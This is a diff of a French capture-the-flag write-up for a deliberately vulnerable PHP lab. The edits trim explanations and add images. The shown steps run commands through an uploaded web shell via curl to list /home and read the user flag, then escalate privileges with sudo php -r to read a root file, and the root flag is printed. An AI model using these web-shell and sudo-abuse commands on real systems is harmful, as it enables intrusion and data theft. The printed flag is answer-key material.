@@ -4,14 +4,15 @@
 **Difficulte:** Facile  
 **Points:** 20  
 **Flags:** 2  
-**Taux de reussite global:** 25%  
 **Auteur:** doacyber  
+
+![FiPloit Lab](fiPloit_lab.png)
 
 ---
 
 ## Introduction
 
-Ce lab simule une application web PHP vulnerables qui tourne dans un environnement de type entreprise fictive appele **SecureCorp**.
+Ce lab simule une application web PHP vulnerable qui tourne dans un environnement de type entreprise fictive appele **SecureCorp**.
 
 L'objectif est de compromettre le serveur en obtenant deux flags :
 - Un flag utilisateur (user flag)
@@ -55,7 +56,7 @@ nmap -sC -sV -p- TARGET_IP
 
 ## Etape 2 — Enumeration des fichiers et repertoires
 
-Une fois sur l'application, j'ai lance **Gobuster** pour decouvrir des fichiers ou repertoires caches que les developpeurs auraient pu laisser :
+Une fois sur l'application, j'ai lance **Gobuster** pour decouvrir des fichiers ou repertoires caches :
 
 ```bash
 gobuster dir -u http://TARGET_IP:8080 \
@@ -164,7 +165,7 @@ Le serveur a retourne :
 ctf
 ```
 
-L'execution de code a distance etait confirmee. J'avais le controle du serveur en tant qu'utilisateur `ctf`.
+L'execution de code a distance etait confirmee.
 
 **Note sur les `+` dans l'URL :** Les espaces sont interdits dans les URLs. Le `+` est l'encodage d'un espace dans les parametres GET. Donc `cmd=sudo+ls` est lu par le serveur comme `sudo ls`.
 
@@ -176,14 +177,6 @@ Avec le RCE confirme, j'ai enumere le systeme via curl depuis mon terminal :
 
 ```bash
 curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=ls+/home"
-```
-
-- `curl` : outil pour faire des requetes HTTP depuis le terminal
-- `ls+/home` : liste le contenu du dossier /home (les + sont des espaces)
-
-J'ai decouvert le dossier `/home/ctf`. J'ai ensuite lu le flag :
-
-```bash
 curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=cat+/home/ctf/flag-user.txt"
 ```
 
@@ -193,7 +186,7 @@ curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=cat+/home/ctf/flag-user.tx
 
 ## Etape 8 — Enumeration des privileges sudo
 
-Pour chercher comment escalader les privileges vers root, j'ai verifie ce que l'utilisateur `ctf` avait le droit de faire en tant que root :
+Pour chercher comment escalader les privileges vers root :
 
 ```bash
 curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+-l"
@@ -214,9 +207,7 @@ L'utilisateur `ctf` peut executer **PHP en tant que root sans mot de passe**. C'
 
 ## Etape 9 — Escalade de privileges vers root
 
-`sudo cat` n'etait pas dans la liste des commandes autorisees, donc je ne pouvais pas lire directement `/root/root.txt` avec cat.
-
-Mais PHP etait autorise. J'ai utilise une fonction PHP pour lire le fichier a la place de cat :
+`sudo cat` n'etait pas dans la liste des commandes autorisees. J'ai utilise PHP a la place :
 
 ```bash
 curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+php+-r+%22echo+file_get_contents('/root/flag-root.txt');%22"
@@ -225,8 +216,7 @@ curl "http://TARGET_IP:8080/uploads/shell.txt.php?cmd=sudo+php+-r+%22echo+file_g
 Decomposition de la commande :
 
 - `sudo` : execute en tant que root
-- `php -r` : execute du code PHP directement en ligne de commande sans creer de fichier
-- `echo` : affiche le resultat a l'ecran
+- `php -r` : execute du code PHP directement en ligne de commande
 - `file_get_contents('/root/flag-root.txt')` : fonction PHP qui lit le contenu d'un fichier
 - `%22` et `%27` : encodage URL des guillemets `"` et `'`
 
@@ -235,6 +225,8 @@ Decomposition de la commande :
 ```
 739eabe6-3085-4852-beb2-1d0da7eb1973
 ```
+
+![Felicitations](felicitations.png)
 
 ---
 
